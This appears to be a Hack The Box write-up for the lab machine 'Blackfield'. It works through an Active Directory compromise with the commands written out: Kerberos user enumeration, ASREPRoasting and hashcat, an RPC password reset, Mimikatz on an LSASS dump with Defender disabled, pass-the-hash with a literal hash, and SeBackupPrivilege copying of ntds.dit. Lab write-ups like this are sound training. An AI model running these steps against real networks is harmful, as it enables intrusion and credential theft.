>BOX INFO: BLACKFIELD  
CREATOR: [aas](https://app.hackthebox.eu/users/6259)  
RATING: 4.9/5.0 stars

Welcome, dear reader, to an epic of fantastic proportions - a story of a small-brain pentester trying to tackle his personal Goliath of the times, `BLACKFIELD`. If you haven't tried this box yet, you absolutely should - everything about it was a 5-star experience. It took me the better portion of 10 hours of off-and-on testing to compromise up to `NT AUTHORITY\SYSTEM` and let me be the first to tell you: they payoff was well worth it. It was a slugfest that involved tons of enumeration and finding small holes to navigate through via SMB and RPC. It involved identifying small administrative mistakes that the server had put into place. It even involved a small amount of memory forensics (which I've never even *thought* about learning, up to this point in my hacking career). This box had it all, and overall I was very impressed with the layout maintaining a very logical real-world feel. Let's get to it!

Warning for all ye who enter - here be spoilers! I *highly* recommend trying this box first and using the forums as if it were release day (that's the way I'm doing it, since I'm this far behind) - reading on will just spoil the fun!
{: .notice--warning}

## >> BLIND LEADING THE BLIND

First things first, let's start with the standard - snag the IP of Blackfield from the HTB web interface and add it to your `/etc/hosts`. Here's how it looks when on the new VIP+ dedicated servers:
```
10.129.1.243  blackfield.htb
```
Doing this can help us if there's any kind of virtual host routing, but that's not really an issue on this box - it's more of a convenience thing because I'm too lazy to try to memorize the new IP structure for dedicated servers ðŸ˜› Once we've got that added, let's run an nmap with `sudo nmap -sCV -O -oA tcp-full -p- blackfield.htb`. Breaking the arguments down:
* `-sCV`: This is a concatenation of `-sC` and `-sV`. This runs all of the default scripts and version checking.
* `-O`: Nmap will make an attempt at running operating system checks. This is mostly based on the banner information it receives, so this can be inaccurate at times. Always double-check with information you've verified.
* `-oA`: This tells Nmap to output results in all of its formats - `.xml`, `.gnmap` (greppable), and `.nmap` (pretty version). It takes in the name of the file you want; in this case, it's `tcp-full` so the final results would be `tcp-full.xml`, etc.
* `-p-`: The argument for this is shorthand for `-p1-65535`, which scans all of the possible ports on the box.

With all of that information, let's see the output of the scan.

```

```

There's not a ton open on this box - that makes sense, since it's rated hard after all - but what does it do? From the outside, this looks like a domain controller since we see `DNS:53/tcp`, `KERBEROS:88/tcp`, and `LDAP:389/tcp` open. We'll look deeper into this later; for now, we start enumerating LDAP.

In order to query into LDAP, we'll use `ldapsearch`. It allows us to construct LDAP queries more efficiently than if we were to do so by scripting or by hand. We'll start by getting the default namingcontexts: `ldapsearch -LLL -x -H ldap://blackfield.htb -b '' -s base "(namingcontexts=*)" > namingcontexts.txt` The namingcontexts help us figure out the domain that we're currently looking into at the very list. Namingcontexts also contain the information that a machine needs to know when joining the network. The output is shown here:

![LDAP Naming Context snippet](/assets/images/blackfield/ldap-naming-contexts.png)

Looking through the output, we notice `dc01.blackfield.local` and add it into our `/etc/hosts`; we also take note that we'll be looking into the `BLACKFIELD.LOCAL` domain. It's not much to go off of, so let's pivot to another protocol for enum.

Another quick win for Windows machines lies in SMB - if left open to unauthenticated users, you can potentially score information or even sometimes sensitive files. Start by listing the files with `smbclient -L \\\\blackfield.htb\\ -U ""`. This produces the following list of shares: 

![SMBClient Share Listing](/assets/images/blackfield/smbclient-shares.png)

Naturally, we visit the unusual shares first - `\forensic` and `\profile$`. While unauthenticted we can't reach anything in forensic, we *can* manage to reach something in the profile share. I know a lot of people were tripped up on this portion since there aren't any *files* listed here - only directories - and naturally our brains try to think that you need to get files from SMB for it to be successful. However if you look close, you'll notice that there are usernames - tons of them in fact!

![SMB Username List, as a service...](/assets/images/blackfield/smbclient-directories.png)

Snag these however you'd like - I used nano and copy-and-paste to put them into a file called `user_list.txt`. It's a little tedious and I'd bet there's a way to bash script it, but I figured it would take more time to work it out than to just manually do it. Â¯\\_(ãƒ„)_/Â¯ Now to figure out what to do with these users...

## >> BOOM, ROASTED!

So there's a little trick that we can pull on this box to verify which of that user list exists. Remember our favorite 3-headed dog, ~~Fluffy~~ Kerberos? As it turns out, since it handles authentication we can read into the responses to find out which usernames are valid. [This article](https://ldapwiki.com/wiki/Kerberos%20Error%20Codes#:~:text=Kerberos%20Error%20Codes%20is%20a,network%20traces%20of%20Kerberos%20packets.) does a good job of explaining the codes, but here's the TL;DR. If we send a username...
* ...and get back **KDC_ERR_PREAUTH_REQUIRED** from Kerberos, the account exists and is enabled in some way.
* ...and get back **KDC_ERR_CLIENT_REVOKED** from Kerberos, the account is locked or disabled.
* ...and get back **KDC_ERR_C_PRINCIPAL_UNKNOWN** from Kerberos, that account doesn't exist.

That's it! We don't have to have a valid password at this point due to how Kerberos handles the authentication attempt. We'll use [Kerbrute's userenum module](https://github.com/ropnop/kerbrute) in order to run the checks with our newly-found accounts.

![Kerbrute in action](/assets/images/blackfield/kerbrute-in-action.png)

This spits out that there are 3 valid accounts from the list we found:
* audit2020
* support
* svc_backup

Now what? Since we have a good idea that we're poking a domain controller (see hostname and information above) and we have a list of accounts, we can try to perform an ASREPRoast attack. This attack leverages the Kerberos' function that allows accounts to not have pre-authentication required in order to request a ticket. It doesn't require anything other than a connection to the DC you're trying to authenticate with and logs pre-authentication errors in specific logs to Kerberos, so it's likely less risk to getting noticed. To read more, [check out this Tarlogic Security post on the subject;](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) in the mean time, we're going to launch an ASREPRoast with [Impacket's](https://github.com/SecureAuthCorp/impacket) GetNPUsers.py module. To do this, clone the Impacket suite to your machine and navigate to `<path-to-impacket>/impacket/examples/` and type `GetNPUsers.py -outputfile asrep_1.hash -format hashcat -usersfile <path-to-users.txt from the SMB section> -dc-ip dc01.blackfield.htb blackfield.local/`.

![ASREPRoast results](/assets/images/blackfield/asrep-1-results.png)

This should give us back 3 accounts, but we only see 2 in the output - why? If you look, you now have a file called `asrep_1.hash` that contains a hash for the support account. This is going to be our ticket in. We crack it using `hashcat -m 18200 -o asrep_1.crack --force -a 0 asrep.hash /usr/share/wordlists/rockyou.txt` to produce the password of `support::#00^BlackKnight`!

![Boom, roasted!](/assets/images/blackfield/boom-roasted.gif)

## >> THIS IS HELPDESK SPEAKING...

So we have an account *and* a password now - fantastic! At this point in my journey I tried just about everything I could in order to re-enumerate the services we have access to, even up to trying to psexec/wmiexec my way into the box. I even tried to log in using WinRM on port 5985 to no avail. Then it hit me - *I hadn't even touched RPC yet.* I went back to the drawing board, trying all manner of things. Eventually I tried `enum4linux` with my new username - this net me a few new interesting users, which I then fed into `Kerbrute` again and then another ASREPRoast:

![ASREPRoast 2: Electric Boogaloo](/assets/images/blackfield/asrep-2-results.png)

The ASREPRoast results, unfortunately, only gave us the same hash back that we previously had cracked. It's not all a loss though - it confirmed a few more accounts exist, and they're likely the ones that exist locally given that `Administrator` and `Guest` are showing up in this list. At this point I did get a little frustrated; however, I thought back and remembered that [it's possible to reset passwords with RPC](https://malicious.link/post/2017/reset-ad-user-password-with-linux/). Let's try that.

![Resetting passwords like it's going out of style](/assets/images/blackfield/rpc-reset-password.png)

Look at that! We now have a second set of credentials, `audit2020::p4ssw0rd123!`. Keep in mind that this is risky in a real engagement since we're resetting a *potential* user's password and that should trigger all kinds of alarms. If we use our new account and revisit our old friend the `\forensic` share, we get a much different output - we see 3 directories. Success! Download all of the files if you wish - I only grabbed the ones in `commands_output` and `memory_analysis` - and let's poke around in them on our local machine.

First, the `commands_output` tells an interesting story. From the look of it this server has been compromised before and the forensics team, whoever that may be, were alerted and took captures of certain commands. We get a little generic info out of this (such as the sysinfo.txt file giving operating system details), but not much solid info for progressing. There was a user account added to the Domain Admins group that we hadn't seen yet. It was named `IPwnedYourCompany`, and using crackmapexec to do password spraying with the previously discovered password didn't get me anywhere so I moved on.

Next up is the `memory_analysis` folder. Going into this one gives us plenty of `.zip` files to play with. Looking at the names, they look like Windows processes - if you made that logical jump you'd be right (you can cross-reference this with the `tasklist.exe` process dump in `commands_output`). This folder appears to house some sort of memory dump, but it's not the usual `.vmem` you would get out of something like Volatiliy - it's likely been done by using Process Explorer's "Full Dump" command on the process in question. Unzipping the folders grants a `.DMP` file of the same name - i.e. `wmic.zip -> wmic.DMP`. To unzip them all easily, run `for i in $(ls); do unzip $i -d <path-to-output-dir>; done`.

## >> ALL YOUR HASH ARE BELONG TO US

So now that we have our memory dump unzipped it's time to do some analysis on it. Keep in mind the goal, here - we're looking for a way to progress forward in privileges. Ultimately, that means we need better credentials - ideally ones that allow us to log in to the box over WinRM or a similar service, or allow us to use psexec/wmiexec to get a shell. With that in mind, I noticed that `lsass.DMP` was present and made the connection to the Windows process `lsass.exe`. For those unaware, LSASS is the process that [handles Windows authentication in memory](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). This means that if there were authentication attempts, it was likely captured in that `lsass.DMP`. Let's pull them back out!

In order to do this, you'll likely just want to spin up a Windows VM of some sort. I know there are ways to run Mimikatz with Wine/Winetricks, but I was too lazy to go figure them out. Â¯\\_(ãƒ„)_/Â¯
{: .notice--info}

In my Windows VM, I had to do a few things before running Mimikatz and I recommend you do them as well. First - turn Defender off. While you're in the menu, add an exception to wherever you're about to copy the memory dumps/Mimikatz. It'll save us lots of headache. Secondly - get those files on the box, specifically a copy of `Mimikatz.exe` and `lsass.DMP`. Once you've done that, we're set up and ready to rock.

Start by running a command prompt as admin and navigating to the files, then run Mimikatz.exe. Once you're in the Mimikatz prompt, I ran the following:
* privilege::debug
* token::elevate
* sekurlsa::minidump <path-to-lsass.DMP>
* sekurlsa::logonPasswords

...and the output...

![Dumping creds since 2007](/assets/images/blackfield/mimikatz-process.png)

Neat. We now have NTLM hashes for 2 accounts - I found both `svc_backup` and `Administrator`. Let's use CrackMapExec to verify whether the hashes are any good.

![We're cracked!](/assets/images/blackfield/crackmapexec-check-both-hashes.png)

As we (somewhat) expected, the Administrator hash doesn't do us any good. `svc_backup`, on the other hand, is valid - now the gates are wide open. Initially I tried cracking the hash with Hashcat, but that proved to be pointless. Instead, I discovered that I could do pass-the-hash with the [Evil-WinRM shell](https://github.com/Hackplayers/evil-winrm). To do that, type in `evil-winrm -i blackfield.htb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -s /home/vagrant/htb/machines/hard/blackfield/enum/privesc` - `-H` specifies a hash (we only need the LM portion) and `-s` specifies where to load scripts from (I had moved several `.ps1` scripts into there just in case I needed them).

![Evil-WinRM as svc_backup](/assets/images/blackfield/evil-winrm-svc-backup.png)

And with that...

![Very nice!](/assets/images/blackfield/borat-great-success.gif)

## >> BACK, BACK, BACK IT UP

Our work doesn't stop here, though - we only *just* got user access to the server! At this point I started doing my usual enumeration and hit something neat almost immediately. When I ran `whoami /all`, the following popped up in the privilege section:

![Oh my!](/assets/images/blackfield/whoami-privs-interesting.png)

So those two privileges aren't something I had dealt with before - I've seen other ones like `SeImpersonatePrivilege` used in other exploits before but not these two. Googling just `SeBackupPrivilege exploit` shows us that there's no shortage of information on the topic (screencap is shortened - there's more after that):

![Woah, that's a lotta damage!](/assets/images/blackfield/sebackup-google.png)

In order to learn about the exploit, I personally enjoyed reading through [this whitepaper by Andrea Pierini](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf) and [this article by FoxGlove security](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/). Either of these articles do a phenomenal job of explaining it in *waaaaaay* more detail than I can right now, but here's the TL;DR as I understand it.

`SeBackupPrivilege` is a token given to members of the "Backup Operators" group in order to allow the account the ability to, well, actually back things up. This in turn means  that the account provisioned with `SeBackupPrivilege` *essentially* acts as a member of the Operating System - it allows the account to copy and restory *any* file on the operating system, irrespective of privilege level. Naturally, members of "Backup Operators" are also given `SeRestorePrivilege` to allow the ability to restore files on the operating system in the same manner. All of these built-in groups and their privileges are [well documented by Microsoft](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators).

Now on to the exploitation - I ended up using the `diskshadow.exe` method of backing up files, as mentioned in the previously mentioned Andrea Pierini whitepaper. As I was trying to elevate my privileges, I targeted the NTDS.dit file to snag the hashes of all the AD users and paired it with a lovely helping of the SYSTEM registry hive. Following the process [here](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/), I created a script to pass to diskshadow with the following contents:

```bat
set context persistent nowriters 
add volume C: alias hello 
create 
expose %hello% Z: 
```

One thing that isn't as clear to you, the reader, is that in each line of that script I added a space (" ") at the end of the line. Without it, my script would error out - I'm assuming this is because `diskshadow` may use it as some sort of line-terminating character. Either way, transfer your script to disk - I uploaded mine to `C:\Windows\Temp\script.dsh`. I *also* added the DLLs from [giuliano108's github repository](https://github.com/giuliano108/SeBackupPrivilege) to the same spot on disk.

![Downloading...](/assets/images/blackfield/privesc-downloading-dlls.png)

Once everything was in place, it was time to execute. I ran the following PowerShell commands in order to copy the NTDS.DIT and the SYSTEM registry hive, denoted on lines where there's a `PS>`:

```powershell
PS> $script = ".\script.dsh"
PS> diskshadow.exe /s $script
PS> Import-Module .\SeBackupPrivilegeUtils.dll
PS> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS> Set-SeBackupPrivilege
PS> Get-SeBackupPrivilege
PS> Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit .\ntds.dit
PS> reg save hklm\system .\system.bak
```

This resulted in snagging both the NTDS.DIT and SYSTEM hive and saving them both to `C:\Windows\Temp`. I then used the download function of the `Evil-WinRM` shell to copy both files to my attacking box. To do this, just type `download <path-to-file>` when at the main Evil-WinRM terminal. With both the `NTDS.DIT` and `SYSTEM` hive in hand, I proceeded to use the Impacket script `secretsdump.py` to leak the hashes for all users. Executing `secretsdump.py -system sys.bak -ntds ntds.dit LOCAL > ntds.hashes` nets us a nice grouping of hashes, one of which is for Administrator: 

![Quite the tasty treat, don't you think?](/assets/images/blackfield/secretsdump-hashes.png)

Once again, my first thought was to crack the hashes - and once again I failed. Oh well, no worry...Evil-WinRM (again) to the rescue! Re-using the same pass-the-hash method from before, we can get a WinRM shell as our beloved Administrator.

## >> RECAP/LESSONS LEARNED

So, to TL;DR our attack path:
* Nmap led us to LDAP to get the namingcontexts
* We used smbclient to snag a userlist made of directories
* Kerbrute gave us a validated list of user accounts, from our SMB userlist
* We performed an ASREPRoast to get a valid ticket
* Hashcat cracked the ticket to give us a password to the `support` account
* RPC was used to reset the `audit2020` account's password
* Getting into the `audit2020` account gave us ALL the info on the forensic investigation
* We stole hashes from a procdump of the `lsass.exe` process
* We did pass-the-hash to login via WinRM as `svc_backup`
* `SeBackupPrivilege` tokens were abused to download an NTDS and SYSTEM hive
* Finally, we did *another* pass-the-hash to login as `Administrator`

Jeez, I'm tired after writing up the whole thing - almost as much as when I finished the box. I learned a ton on this one, mostly related to the memory forensics and `SeBackupPrivilege` portions - but the thing I'm most excited about is that it reinforced some great logical thinking without being busywork. Overall, this box was a phenomenal time - I basically worked on it for ~10 hours without stopping and I don't regret that for one second. Much love, and happy hacking to all!
